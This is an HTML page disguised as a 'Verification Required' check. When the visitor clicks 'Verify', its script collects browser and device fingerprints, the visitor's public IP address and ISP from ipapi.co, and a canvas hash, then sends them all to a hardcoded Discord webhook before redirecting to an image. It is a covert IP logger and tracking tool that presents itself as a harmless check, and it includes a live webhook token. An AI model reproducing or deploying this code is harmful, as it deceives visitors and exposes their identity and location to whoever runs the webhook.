<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verification</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: #f1f5f9;
    }

    .container {
      text-align: center;
      background: rgba(0, 0, 0, 0.45);
      padding: 40px;
      border-radius: 12px;
      backdrop-filter: blur(6px);
      width: 90%;
      max-width: 400px;
    }

    h1 {
      margin-bottom: 20px;
      font-size: 28px;
    }

    #verifyBtn {
      padding: 14px 28px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      background: #2563eb;
      color: white;
      transition: 0.2s;
    }

    #verifyBtn:hover {
      background: #1d4ed8;
    }
  </style>
</head>

<body>
  <div class="container" id="mainContainer">
    <h1>Verification Required</h1>
    <button id="verifyBtn">Verify</button>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1460903984490348659/Fzyuz34Mlft-E5yqJ5-xK1_C63VktMnY0chQqiiJ7xQul3xntvRFSc5fG2h20aU5P6Gh";

    document.getElementById("verifyBtn").addEventListener("click", async () => {
      const container = document.getElementById("mainContainer");
      container.innerHTML = "<h1>Loading…</h1>";

      await runVerification();

      // Redirect to your image after scan
      window.location.href = "https://raw.githubusercontent.com/ObiStonedKenobi/safe-or-not/main/Messenger_creation_304546BB-5FFB-4AFF-BC7A-453EA3D57CCE.jpeg";
    });

    async function runVerification() {
      const now = new Date();
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

      const basic = {
        timestamp: now.toISOString(),
        localTime: now.toString(),
        timezone: tz,
        offsetMinutes: now.getTimezoneOffset(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack
      };

      const screenInfo = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        pixelRatio: window.devicePixelRatio,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight
      };

      const touch = {
        maxTouchPoints: navigator.maxTouchPoints,
        touchEvent: "ontouchstart" in window
      };

      function getWebGL() {
        const out = { supported: false, vendor: "unknown", renderer: "unknown" };
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          if (!gl) return out;
          out.supported = true;
          const debug = gl.getExtension("WEBGL_debug_renderer_info");
          if (debug) {
            out.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
            out.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
          }
        } catch {}
        return out;
      }

      function getCanvasFP() {
        try {
          const c = document.createElement("canvas");
          const ctx = c.getContext("2d");
          ctx.textBaseline = "top";
          ctx.font = "14px Arial";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069";
          ctx.fillText("fingerprint_test", 2, 15);
          return c.toDataURL();
        } catch {
          return "Unavailable";
        }
      }

      const webgl = getWebGL();
      const canvasFP = getCanvasFP();

      const network = await fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .catch(() => ({ error: true }));

      const collected = {
        basic,
        screen: screenInfo,
        touch,
        webgl,
        canvasFingerprint: canvasFP,
        network
      };

      // Send summary embed
await fetch(WEBHOOK_URL, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    username: "Verification Scanner",
    content: "New verification result",
    embeds: [{
      title: "Scanned Environment",
      color: 3447003,
      fields: [
        // —— TIMEZONE ——
        { name: "Timestamp", value: `${basic.timestamp || "Unknown"}`, inline: false },
        { name: "Local Time", value: `${basic.localTime || "Unknown"}`, inline: false },
        { name: "Timezone", value: `${basic.timezone || "Unknown"}`, inline: true },
        { name: "UTC Offset (Minutes)", value: `${basic.offsetMinutes || "Unknown"}`, inline: true },
      
        // —— SYSTEM ——
        { name: "Platform", value: `${basic.platform || "Unknown"}`, inline: true },
        { name: "CPU Threads", value: `${basic.hardwareConcurrency || "Unknown"}`, inline: true },
        { name: "Device Memory", value: `${basic.deviceMemory || "Unknown"}`, inline: false },
        { name: "Cookies Enabled", value: `${basic.cookieEnabled || "Unknown"}`, inline: false },
        { name: "Do Not Track", value: `${basic.doNotTrack || "Unknown"}`, inline: true },
        { name: "User Agent", value: `${basic.userAgent || "Unknown"}`, inline: false },

        // —— GRAPHICS ——
        { name: "WebGL Supported", value: `${webgl.supported || "Unknown"}`, inline: true },
        { name: "WebGL Vendor", value: `${webgl.vendor || "Unknown"}`, inline: false },
        { name: "WebGL Renderer", value: `${webgl.renderer || "Unknown"}`, inline: false },

        // —— NETWORK ——
        { name: "IP Address", value: `${network.ip || "Unknown"}`, inline: false },
        { name: "ISP / Org", value: `${network.org || "Unknown"}`, inline: false },
        { name: "Lookup Status", value: `${network.lookupStatus || "Unknown"}`, inline: false },

        // —— CANVAS ——
        { name: "Canvas Hash", value: `${canvasFP || "Unknown"}`, inline: false },

        // —— NOTES ——
        { name: "Environment Notes", value: "None", inline: false }
      ],
      footer: {
        text: "Verification Scanner · Summary Report"
      },
      timestamp: new Date().toISOString()
    }]
  })
});

// Delay before returning to caller (3.0s)
await new Promise(resolve => setTimeout(resolve, 3000));
    }
  </script>

</body>
</html>
